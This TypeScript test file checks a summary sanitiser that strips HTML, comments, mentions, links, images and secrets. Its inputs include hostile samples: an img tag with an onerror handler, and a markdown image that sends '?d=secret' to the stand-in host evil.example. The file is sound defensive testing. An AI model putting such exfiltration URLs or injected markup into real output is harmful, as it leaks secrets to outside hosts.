import { test } from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeSummary, SUMMARY_MAX_CHARS } from './summary.ts'
import { registerSecret } from '../util/secrets.ts'
import { ENTRY_START } from './format.ts'

const ZWSP = '​'

test('TAD.1: plain text passes through; CRLF is normalised and blank-line runs collapse', () => {
  assert.equal(sanitizeSummary('  Two paragraphs.\r\n\r\n\r\n\r\nSecond one.  '), 'Two paragraphs.\n\nSecond one.')
})

test('TAD.2: an empty or whitespace-only summary becomes an empty string', () => {
  assert.equal(sanitizeSummary(''), '')
  assert.equal(sanitizeSummary(' \n\t '), '')
})

test('TAD.3: HTML comments and tags are stripped — the entry delimiters can never be forged', () => {
  const out = sanitizeSummary(`${ENTRY_START} hello <b>bold</b> <!-- hidden --> <img src=x onerror=y> end`)
  assert.ok(!out.includes('<!--'))
  assert.ok(!out.includes('<b>'))
  assert.ok(!out.includes('<img'))
  assert.match(out, /hello bold\s+end/)
})

test('TAD.4: nested markup that would re-form a comment after one stripping pass is fully removed', () => {
  const out = sanitizeSummary('a <<b>!-- forged --> b <!-- unterminated')
  assert.ok(!out.includes('<!--'), out)
})

test('TAD.5: @mentions are defanged so the summary cannot ping anyone', () => {
  const out = sanitizeSummary('cc @octocat and @my-org/reviewers')
  assert.ok(!/@octocat/.test(out))
  assert.ok(!/@my-org/.test(out))
  assert.ok(out.includes(`@${ZWSP}octocat`))
})

test('TAD.6: markdown images are dropped and links reduced to their label (no exfiltration URLs)', () => {
  const out = sanitizeSummary('see ![x](https://evil.example/p.png?d=secret) and [the docs](https://evil.example/a) ok')
  assert.ok(!out.includes('evil.example'))
  assert.ok(out.includes('the docs'))
})

test('TAD.7: reference-style link definitions and <autolinks> are removed', () => {
  const out = sanitizeSummary('text [ref]\n\n[ref]: https://evil.example/x\n\n<https://evil.example/y> end')
  assert.ok(!out.includes('evil.example'))
})

test('TAD.8: code fences are flattened, inline code survives, line-leading # cannot open a heading', () => {
  const out = sanitizeSummary('quote:\n```ts\nconst a = `x`\n```\n### Notes\nuse `foo()` here')
  assert.ok(!out.includes('```'))
  assert.ok(out.includes('`foo()`'))
  assert.ok(!/^\s*#/m.test(out), 'no line may start with #')
})

test('TAD.9: registered secrets are redacted', () => {
  registerSecret('sk-very-secret-value-123')
  assert.ok(!sanitizeSummary('leaked sk-very-secret-value-123 here').includes('sk-very-secret-value-123'))
})

test('TAD.10: an over-long summary is clipped to the limit with an ellipsis', () => {
  const out = sanitizeSummary('word '.repeat(2000))
  assert.ok(out.length <= SUMMARY_MAX_CHARS, `length ${out.length}`)
  assert.ok(out.endsWith('…'))
})

test('TAD.11: a clip that would leave an inline code span open closes it', () => {
  const out = sanitizeSummary(`${'a'.repeat(SUMMARY_MAX_CHARS - 3)} \`code that never ends`)
  assert.equal((out.match(/`/g) ?? []).length % 2, 0)
  assert.ok(out.length <= SUMMARY_MAX_CHARS)
})

test('TAD.12: a summary within the limit is not touched by the clip', () => {
  const text = 'x'.repeat(SUMMARY_MAX_CHARS)
  assert.equal(sanitizeSummary(text), text)
})
